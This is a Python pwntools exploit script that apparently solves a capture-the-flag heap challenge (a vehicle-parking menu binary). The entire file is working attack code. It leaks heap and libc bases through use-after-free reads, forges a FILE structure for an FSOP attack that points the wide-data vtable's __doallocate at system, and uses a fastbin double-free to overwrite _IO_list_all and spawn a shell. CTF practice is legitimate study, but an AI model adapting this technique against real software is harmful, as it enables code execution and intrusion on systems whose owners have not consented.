#!/usr/bin/env python3
from pwn import *

PORT = 13339
HOST = "127.0.0.1"
elf = context.binary = ELF('./pwn5_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            brva 0x000000000000182E
            brva 0x00000000000013F1
            brva 0x000000000000167D
            brva 0x00000000000015FC
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def sla(pr, data):
	p.sendlineafter(pr, data)

def sa(pr, data):
	p.sendafter(pr, data)


def menu(opt):
	sla(b' >>', str(opt).encode())

def park(idx, size, data):
	menu(1)
	sla(b'number : ', str(idx).encode())
	sla(b'size (bytes) : ', str(size).encode())
	sa(b'information : ', data)

def view(idx):
	menu(2)
	sla(b'number : ', str(idx).encode())

def remove(idx):
	menu(3)
	sla(b'number : ', str(idx).encode())

# Stage 1: Leak heap, leak libc

park(1, 0x500, b'B'*8)
park(0, 0x40, b'A'*8)

remove(0)
remove(1)

view(0)
p.recvuntil(b'=> Vehicle information at slot [0]:\n')
heap_base = u64(p.recv(5).ljust(8, b'\0')) << 12
log.info(f'heap_base: {hex(heap_base)}')

view(1)
p.recvuntil(b'=> Vehicle information at slot [1]:\n')
libc.address = u64(p.recv(6).ljust(8, b'\0')) - 0x21ace0
log.info(f'libc_base: {hex(libc.address)}')

# Stage 2: FSOP

heap = heap_base + 0x2a0
_IO_wfile_jumps = libc.sym._IO_wfile_jumps
fake_wide_data = heap + 0x100
fake_wide_vtable = heap + 0x200

fake_file = flat({
    0x00: b'  sh\x00',      # _flags
    0x68: 0,                			# _chain
    0x88: heap + 0x400,      			# _lock
    0xa0: fake_wide_data,  				# _wide_data
    0xc0: 1,                			# _mode
    0xd8: libc.sym._IO_wfile_jumps,  	# vtable
    }, filler = b'\x00')

fake_file = fake_file.ljust(0x100, b'A')

fake_file += flat({    
    0x18: 0,                    # _IO_write_base
    0x20: 1,                    # _IO_write_ptr > _IO_write_base
    0x30: 0,                    # _IO_buf_base
    0xe0: fake_wide_vtable,     # _wide_vtable
    }, filler = b'\x00')

fake_file = fake_file.ljust(0x200, b'B')

fake_file += flat({
    0x68: libc.sym.system            # __doallocate = system
    }, filler = b'\x00')

park(1, 0x500, fake_file)
print(hex(len(fake_file)))
## Fastbin dup overwrite __IO_list_all
for i in range(4, 13):
    park(i, 0x60, b'X'*8)

# Fill tcache[0x70] with 7 chunks
for i in range(6, 13):
    remove(i)

## fastbin: A -> B -> A
remove(4)
remove(5)
remove(4)

for i in range(6, 13):
    park(i, 0x60, b'D' * 8)

target = p64((heap_base >> 12) ^ libc.sym._IO_list_all)

park(2, 0x60, target)
park(3, 0x60, b'd1nhdwc')
park(4, 0x60, b'd1nhdwc')

park(5, 0x60, p64(heap))
# GDB()
menu(4)

p.interactive()